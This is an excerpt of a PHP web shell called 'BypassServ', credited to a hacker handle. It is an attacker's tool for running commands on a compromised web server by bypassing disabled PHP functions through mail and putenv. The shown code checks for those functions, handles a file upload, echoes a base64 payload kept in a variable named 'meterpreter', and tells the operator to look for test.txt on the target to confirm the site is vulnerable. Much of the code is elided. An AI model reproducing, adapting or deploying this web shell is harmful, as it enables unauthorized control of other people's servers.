...
<html>
<head>
    <title>BypassServ By 1310NG1337</title>
    <meta charset="UTF-8">
...
echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ 1310NG1337]</font><br>";
if (function_exists('mail')) {
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        ...
        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By 1310NG1337urity</font><br><br></textarea>';        
